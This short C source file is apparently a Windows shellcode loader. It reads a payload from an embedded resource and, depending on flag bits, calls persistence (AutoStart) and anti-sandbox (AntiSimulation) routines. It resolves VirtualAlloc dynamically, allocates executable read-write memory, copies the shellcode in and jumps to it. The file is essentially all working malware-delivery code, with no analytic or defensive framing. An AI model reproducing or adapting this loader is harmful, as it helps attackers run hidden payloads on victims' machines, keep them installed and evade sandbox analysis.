#include <windows.h>
#include "../Loader.h"
typedef LPVOID(WINAPI *pfnVirtualAlloc)(_In_opt_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flAllocationType, _In_ DWORD flProtect);
int main()
{
	UINT shellcodeSize = 0;
	unsigned char *shellcode = GetShellcodeFromRes(SOURCEID, &shellcodeSize);
	if (shellcode == NULL)
	{
		printf("Get Resource error\n");
		return 1;
	}
	if (*shellcode & 1)
	{
		AutoStart();
	}
	if (*shellcode & 2)
	{
		AntiSimulation();
	}

	//2.Get shellcode memory
	pfnVirtualAlloc fnVirtualAlloc = (pfnVirtualAlloc)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAlloc");
	LPVOID Memory = fnVirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!Memory)
	{
		printf("VirtualAlloc error %d\n", GetLastError());
		return 1;
	}
	memcpy(Memory, shellcode + 2, shellcodeSize);
	//3.Execute shellcode
	((void (*)())Memory)();
}